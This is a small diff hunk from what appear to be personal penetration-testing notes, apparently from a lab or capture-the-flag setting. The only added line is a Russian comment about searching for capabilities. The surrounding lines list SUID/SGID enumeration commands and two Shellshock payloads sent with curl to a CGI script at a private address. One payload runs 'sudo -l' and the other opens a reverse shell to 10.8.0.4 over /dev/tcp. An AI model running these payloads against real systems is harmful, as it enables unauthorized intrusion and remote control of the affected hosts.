@@ -60,6 +60,8 @@
         find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
         find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
         
+# поиск capabiliti
+
 curl -H "User-Agent: () { :;}; echo; /bin/sudo -l" http://10.8.0.10/cgi-bin/shell.sh
 
 curl -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.8.0.4/1234 0>&1" http://10.8.0.10/cgi-bin/shell.sh
